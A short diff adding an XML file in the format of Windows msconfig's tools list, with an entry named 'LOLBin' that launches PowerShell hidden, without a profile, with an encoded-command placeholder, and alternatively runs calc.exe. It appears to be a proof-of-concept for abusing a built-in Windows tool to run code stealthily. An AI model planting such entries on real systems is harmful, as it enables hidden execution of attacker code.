@@ -1,0 +1,4 @@
+<?xml version="1.0" ?>
+<MSCONFIGTOOLS>
+<a NAME="LOLBin" PATH="%windir%\System32\WindowsPowerShell\v1.0\powershell.exe" DEFAULT_OPT="-nop -sta -enc -w 1 <BASE64ENCCOMMAND>" ADV_OPT="-command calc.exe" HELP="LOLBin MSCONFIGTOOLS"/>
+</MSCONFIGTOOLS>
